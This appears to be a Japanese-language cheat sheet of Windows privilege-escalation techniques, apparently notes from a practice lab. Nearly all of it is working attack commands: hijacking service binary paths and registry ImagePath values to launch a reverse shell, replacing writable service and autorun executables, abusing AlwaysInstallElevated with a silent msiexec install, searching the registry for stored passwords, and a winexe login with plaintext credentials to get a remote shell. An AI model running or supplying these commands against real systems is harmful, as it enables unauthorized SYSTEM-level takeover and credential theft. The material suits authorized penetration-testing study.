【1:サービスを利用したリバースシェルの実行】
--------------------------------------
1. daclsvc を利用したリバースシェルの実行
・条件：
SERVICE_CHANGE_CONFIG サービスの起動時に任意の実行ファイルを開始するようにシステムを設定できる
・方法：
以下のコマンドで、実行パスを変更する。
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
net start daclsvc で サービス実行すると、reverse.exe が起動する

2. unquotedsvc を利用したリバースシェルの実行
・条件
C:\Program Files\Unquoted Path Service\ への書込権限が必要
・方法
以下のコマンドで、Common.exe ファイルを作成する。
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start daclsvc で サービス実行すると、reverse.exe が起動する

3. regsvc を利用したリバースシェルの実行
・条件
regsvc が SYSTEM 権限で動作している (SERVICE_START_NAME)
regsvc service のレジストリを NT AUTHORITY\INTERACTIVE に所属するユーザが書き込めること
・方法
以下の手順で、レジストリの追加し、サービスを起動する。
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc

4. filepermsvc を利用したリバースシェルの実行
・条件
filepermservice.exe を誰でも書込可能なこと
・方法
バイナリを置き換えてサービスを起動する。
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
net start filepermsvc

【2:自動起動アプリを利用したリバースシェルの実行】
--------------------------------------
・条件
自動起動に登録されたアプリを書き換え可能なこと
※一覧の表示
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
・方法
バイナリを書き換えて、ログインし直す。
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

【3. msi ファイルを利用したリバースシェルの実行】
・条件
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
両方の Key値が 0x1 であること
・方法
msi ベースのリバースシェルを実行 (ダブルクリックでも良いが、以下だと UI が出ない。）
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

【4. レジストリ内の情報】
・方法
「password」キーワードでレジストリを検索する。
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

以下のコマンドで、リモートで shell 接続できる。
winexe -U 'admin%password123' //10.10.136.203 cmd.exe






